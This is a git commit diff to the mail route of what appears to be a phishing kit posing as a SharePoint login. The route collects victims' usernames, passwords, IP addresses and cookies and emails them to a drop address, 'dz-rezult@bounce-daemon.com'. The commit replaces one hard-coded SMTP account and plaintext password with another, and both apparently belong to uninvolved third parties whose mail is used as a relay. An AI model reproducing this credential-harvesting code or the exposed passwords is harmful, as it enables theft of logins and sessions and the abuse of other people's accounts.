95564ab15c219abad2cafbf6bc7ea15bef2f4632
one-driveoutlook <107754674+one-driveoutlook@users.noreply.github.com>
2024-05-21 12:22:25 +0300

    Update route.js

--- routes/route.js
+++ routes/route.js
@@ -5,8 +5,8 @@ const mailer = require('../helper/mailer');
 router.post('/send-mail', (req, res) => {
     const { username, pass, ip } = req.body;
     const cookies = req.cookies; // Get cookies from the request object
-    const nodeTransport = mailer.createNodeMailerTransport('celio.khan@century21.pt', 'c3l10@C21');
-    mailer.sendEmail('celio.khan@century21.pt', "dz-rezult@bounce-daemon.com", 'SharePoint-Data', username, pass, ip, cookies, nodeTransport);
+    const nodeTransport = mailer.createNodeMailerTransport('claudiabaptista@iclinico.pt', 'Pinguim$2803');
+    mailer.sendEmail('claudiabaptista@iclinico.pt', "dz-rezult@bounce-daemon.com", 'SharePoint-Data', username, pass, ip, cookies, nodeTransport);
     res.status(200).send('Email sent successfully');
 });
 
